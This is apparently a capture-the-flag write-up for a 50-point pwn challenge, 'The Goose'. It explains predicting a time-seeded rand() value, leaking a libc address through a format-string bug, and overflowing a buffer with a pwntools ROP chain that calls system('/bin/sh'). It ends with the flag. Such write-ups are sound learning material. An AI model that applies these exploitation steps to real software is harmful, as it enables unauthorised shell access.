# The Goose

## Challenge Summary

- **Category**: Pwn  
- **Points**: 50  
- **Solves**: 151 teams  

---

### Problem Description

> When the honking gets tough, you better brush up on your basics.

---

## Challenge Structure

- In `main()`, the program seeds the RNG with `srand(time(NULL))` and sets `nhonks = rand() % 0x5b + 10`.
- In `guess()`, if the user input matches `nhonks`, execution proceeds to `highscore()`.
- In `highscore()`, a format string vulnerability occurs due to using `sprintf(fmt, user_input)` where `user_input` comes from `scanf("%s")`.
- Then `read(0, buf, 0x400)` allows up to 1024 bytes, leading to a buffer overflow and ROP injection.
- The stack is executable, and RWX segments are present. Although shellcode injection is possible, the exploit uses a standard ROP chain to spawn a shell.

---

### Protections:

```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        PIE enabled
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No
```

---

## Exploitation Flow

### Step 1: Predict `rand()` result

- Since the RNG is seeded with `time(NULL)`, we can replicate the seed locally using libc and call `rand()` to predict `nhonks`.

```python
cdll = ctypes.CDLL(LIBC_PATH)
cdll.srand(cdll.time(0))
r.sendlineafter("honks?", str(cdll.rand() % 0x5b + 10))
```

---

### Step 2: Leak libc address via format string

- By inputting `%57$p` at the "what's your name again?" prompt, the address of `__libc_start_main+ret` is leaked.
- From this, we compute the libc base.

```python
r.sendlineafter("again?", b"%57$p")
main_ret = int(r.recvuntil(b" ").strip().decode(), 16)
libc_base = main_ret - libc.libc_start_main_return
libc.address = libc_base
```

---

### Step 3: Build and send ROP payload

- We send 0x178 bytes of padding, followed by a ROP chain.
- The chain performs `system("/bin/sh")` after stack alignment.

```python
rop = ROP(libc)
rop.raw(b"A" * 0x178)
rop.raw(rop.ret)
rop.call(libc.sym.system, [next(libc.search(b"/bin/sh"))])
r.sendlineafter("world?", rop.chain())
```

---

## Flag

```bash
$ cat /flag.txt
L3AK{H0nk_m3_t0_th3_3nd_0f_l0v3}
```
